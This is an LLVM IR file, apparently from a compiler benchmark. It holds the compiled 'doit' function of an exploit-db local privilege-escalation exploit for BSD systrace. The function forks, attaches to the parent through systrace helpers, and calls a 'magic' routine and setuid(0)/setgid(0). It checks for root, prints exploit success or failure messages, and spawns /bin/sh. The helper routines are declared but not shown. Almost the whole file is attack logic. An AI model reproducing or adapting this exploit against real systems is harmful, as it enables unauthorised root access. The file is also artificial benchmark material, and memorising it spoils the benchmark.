; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_24113.c_doit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_24113.c_doit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [25 x i8] c"[+] Doing some magic... \00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"failed.\0A\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"\0ASorry but the exploit failed.\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"done.\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"uname -v\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"id\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @doit() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = call i32 (...) @nbsd_systrace_open()
  store i32 %4, i32* %3, align 4
  %5 = call i32 (...) @fork()
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %8, label %15

8:                                                ; preds = %0
  %9 = call i32 @sleep(i32 1)
  %10 = load i32, i32* %3, align 4
  %11 = call i32 @nbsd_attach_parent(i32 %10)
  br label %12

12:                                               ; preds = %8, %12
  %13 = load i32, i32* %3, align 4
  %14 = call i32 @nbsd_handle_msg(i32 %13)
  br label %12

15:                                               ; preds = %0
  %16 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %17 = call i32 @sleep(i32 2)
  %18 = call i32 (...) @magic()
  %19 = call i32 @setuid(i32 0)
  %20 = call i32 @setgid(i32 0)
  %21 = load i32, i32* %2, align 4
  %22 = call i32 @kill(i32 %21, i32 9)
  %23 = call i64 (...) @getuid()
  %24 = icmp ne i64 %23, 0
  br i1 %24, label %25, label %29

25:                                               ; preds = %15
  %26 = call i32 @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %27 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0))
  %28 = call i32 @exit(i32 1) #3
  unreachable

29:                                               ; preds = %15
  %30 = call i32 @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %31 = call i32 @system(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %32 = call i32 @system(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %33 = call i32 @execlp(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i32 0)
  ret void
}

declare dso_local i32 @nbsd_systrace_open(...) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @nbsd_attach_parent(i32) #1

declare dso_local i32 @nbsd_handle_msg(i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @magic(...) #1

declare dso_local i32 @setuid(i32) #1

declare dso_local i32 @setgid(i32) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i64 @getuid(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @execlp(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
